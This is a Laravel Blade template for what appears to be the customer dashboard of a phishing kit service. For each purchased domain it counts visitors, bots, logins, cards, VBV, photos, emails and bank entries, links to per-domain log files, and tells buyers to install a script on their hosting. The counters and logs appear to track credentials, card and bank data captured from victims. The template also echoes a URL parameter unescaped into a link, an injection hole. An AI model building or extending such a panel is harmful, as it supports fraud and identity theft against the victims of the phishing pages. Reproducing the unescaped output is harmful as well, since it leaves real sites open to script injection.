@extends('layouts.app-auth')

@section('css')
<link href="https://cdn.jsdelivr.net/npm/@mdi/font@4.x/css/materialdesignicons.min.css" rel="stylesheet">
<link rel="stylesheet" href="/css/vuetify.datatable.css">
@endsection

@section('content')
<div>
    <div class="flex flex-row w-full items-center gap-x-3 mb-3">
        <a href="/manage/domain/config?d=<?=@$_GET['d'];?>">
            <div class="flex justify-center items-center pt-3 pb-2 px-5 bg-white rounded-full text-green-700 bg-green-100 border border-green-300 ">
                <div class="text-xs font-normal leading-none max-w-full flex-initial">Config</div>
            </div>
        </a>
        <a href="#" onclick="resetClick();">
            <div class="flex justify-center items-center pt-3 pb-2 px-5 bg-white rounded-full text-red-700 bg-red-100 border border-red-300 ">
                <div class="text-xs font-normal leading-none max-w-full flex-initial">Reset</div>
            </div>
        </a>
        <a href="#" onclick="getLink()" id="visit" target="_blank">
            <div class="flex justify-center items-center pt-3 pb-2 px-5 bg-white rounded-full text-indigo-700 bg-indigo-100 border border-indigo-300 ">
                <div class="text-xs font-normal leading-none max-w-full flex-initial">Visit</div>
            </div>
        </a>
    </div>
    <div class="flex flex-col relative py-3 my-5 leading-normal bg-green-100 text-green-700 rounded-lg" role="alert">
        <ul class="list-disc ml-10">
            <li>Domain : {{ $data['domain'] }}</li>
            <li>Product : {{ $data['product'] }}</li>
            <li>Purchase Date : {{ $data['date'] }}</li>
        </ul>
    </div>
    <div class="grid grid-cols-3 gap-5">
        <div class="col-span-2 flex flex-row bg-white rounded-lg shadow-md p-10 gap-x-5 items-center">
            <svg class="w-10 h-10 p-2 bg-green-100 stroke-current text-green-500 rounded-full" fill="none" stroke="currentColor" view-box="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
            <div>
                <p class="font-semibold text-xl" id="visitor">0</p>
                <p class="text-xs text-gray-600">Visitor</p>
            </div>
        </div>
        <div class="flex flex-row bg-white rounded-lg shadow-md p-10 gap-x-5 items-center">
            <svg class="w-10 h-10 p-2 bg-gray-100 stroke-current text-gray-500 rounded-full" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.618 5.984A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016zM12 9v2m0 4h.01"></path></svg>
            <div>
                <p class="font-semibold text-xl" id="bot">0</p>
                <p class="text-xs text-gray-600">Bot</p>
            </div>
        </div>
        <div class="flex flex-row bg-white rounded-lg shadow-md p-10 gap-x-5 items-center">
            <svg class="w-10 h-10 p-2 bg-indigo-100 stroke-current text-indigo-500 rounded-full" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 3a1 1 0 011 1v12a1 1 0 11-2 0V4a1 1 0 011-1zm7.707 3.293a1 1 0 010 1.414L9.414 9H17a1 1 0 110 2H9.414l1.293 1.293a1 1 0 01-1.414 1.414l-3-3a1 1 0 010-1.414l3-3a1 1 0 011.414 0z" clip-rule="evenodd"></path></svg>
            <div>
                <p class="font-semibold text-xl" id="login">0</p>
                <p class="text-xs text-gray-600">Login</p>
            </div>
        </div>
        <div class="flex flex-row bg-white rounded-lg shadow-md p-10 gap-x-5 items-center">
            <svg class="w-10 h-10 p-2 bg-red-100 stroke-current text-red-500 rounded-full" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
            <div>
                <p class="font-semibold text-xl" id="card">0</p>
                <p class="text-xs text-gray-600">Card</p>
            </div>
        </div>
        <div class="flex flex-row bg-white rounded-lg shadow-md p-10 gap-x-5 items-center">
            <svg class="w-10 h-10 p-2 bg-yellow-100 stroke-current text-yellow-500 rounded-full" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"></path></svg>
            <div>
                <p class="font-semibold text-xl" id="vbv">0</p>
                <p class="text-xs text-gray-600">VBV</p>
            </div>
        </div>
        <div class="flex flex-row bg-white rounded-lg shadow-md p-10 gap-x-5 items-center">
            <svg class="w-10 h-10 p-2 bg-gray-200 stroke-current text-blue-500 rounded-full" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
            <div>
                <p class="font-semibold text-xl" id="pap">0</p>
                <p class="text-xs text-gray-600">Photo</p>
            </div>
        </div>
        <div class="flex flex-row bg-white rounded-lg shadow-md p-10 gap-x-5 items-center">
            <svg class="w-10 h-10 p-2 bg-gray-200 stroke-current text-blue-500 rounded-full" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.207"></path></svg>
            <div>
                <p class="font-semibold text-xl" id="email">0</p>
                <p class="text-xs text-gray-600">Email</p>
            </div>
        </div>
        <div class="flex flex-row bg-white rounded-lg shadow-md p-10 gap-x-5 items-center">
            <svg class="w-10 h-10 p-2 bg-pink-100 stroke-current text-pink-500 rounded-full" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 14v3m4-3v3m4-3v3M3 21h18M3 10h18M3 7l9-4 9 4M4 10h16v11H4V10z"></path></svg>
            <div>
                <p class="font-semibold text-xl" id="bank">0</p>
                <p class="text-xs text-gray-600">Bank</p>
            </div>
        </div>
    </div>
    <div class="flex flex-col gap-y-5 mt-7">
        <div class="bg-white rounded-lg shadow-md">
          <v-data-table :headers="headers" :items="logs" item-key="name" class="shadow text-left" hide-default-footer>
              <template v-slot:item="logs">
                  <tr>
                    <td>@{{ logs.item }}</td>
                    <td class="flex flex-row gap-x-1 items-center">
                        <a :href="'http://{{$data['domain']}}/logs/'+logs.item" class="no-underline">
                            <svg class="w-6 h-6 text-green-500" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 4a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm0 4a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm0 4a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm0 4a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
                        </a>
                    </td>
                  </tr>
              </template>
          </v-data-table>
        </div>
        <div v-if="pagination.total != 1" class="flex flex-row justify-center items-center pt-2 pb-10">
            <div class=" w-3/4 m-auto">
                <v-pagination class="mb-2" v-model="pagination.current" :length="pagination.total" @input="onPageChange"></v-pagination>
            </div>
        </div>
    </div>
</div>
@endsection

@section('js')

<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>

<script>

      function resetClick(){
        $.ajax({
            url :'/api/domain/reset?domain={{$data['domain']}}',
            method:'GET',
            beforeSend:function()
            {
                $('#modal_loading').show();
            },success:function(data){
                
                getStats();
                $('#modal_loading').hide();
            }
        });
        }
        function getStats()
        {
            $.ajax({
            url:'/api/domain/stats?domain={{$data['domain']}}',
            method:'GET',
            beforeSend:function()
            {
                $('#modal_loading').show();
            },success:function(data)
            {
                if(data.code == 0){
                    alert('Domain not found : You must install script in your hosting first.');
                }else{
                 $('#visitor').text(data.visitor);
                $('#login').text(data.login);
                $('#card').text(data.card);
                $('#vbv').text(data.vbv);
                $('#bot').text(data.bot);
                $('#email').text(data.email);
                $('#pap').text(data.pap); 
                }
                $('#modal_loading').hide();
            },error:function()
            {
                alert('Domain not found : You must install script in your hosting first.');
                $('#modal_loading').hide();
            }
        });
        }
        function getLink()
        {
            $.ajax({
            url :'/api/domain/visit?domain={{$data['domain']}}',
            method:'GET',
            type:'jsonp',
            beforeSend:function()
            {
                $('#modal_loading').show();
            },success:function(data){
               
               $('#modal_loading').hide();
               return window.location.href=data.link;
            },error:function()
            {
                $('#modal_loading').hide();
                return alert('Domain not found : You must install script in your hosting first.');
            }
        });
        }
    $(document).ready(function()
    {
        window.onload = getStats();
     
      
    });
</script>

<script src="https://cdn.jsdelivr.net/npm/vue@2.x/dist/vue.js"></script>
<script src="https://cdn.jsdelivr.net/npm/vuetify@2.x/dist/vuetify.js"></script>
<script>
    new Vue({
        el: '#app',
        vuetify: new Vuetify(),
        mounted(){
            this.getLogs()
        },
        data: {
            logs: [],
            headers: [
                { text: 'Log name', sortable: true, value: 'name'},
                { text: 'Action', sortable: false}
            ],
            pagination: {
                itemsPerPage: 10,
                current: 1,
                total: 1
            },
        },
    methods: {
            getLogs(){
                this.startLoading()
                fetch('/api/domain/logs?domain={{$data['domain']}}')
                .then(res => res.json())
                .then(data => {
                    this.logs = data;
                    this.endLoading()
                })
            },
            onPageChange(){
                this.getAllPurchases()
            },
            startLoading(){
                document.getElementById('modal_loading').style.display = 'block'
            }, 
            endLoading(){
                document.getElementById('modal_loading').style.display = 'none'
            }
        },
    })
</script>
@endsection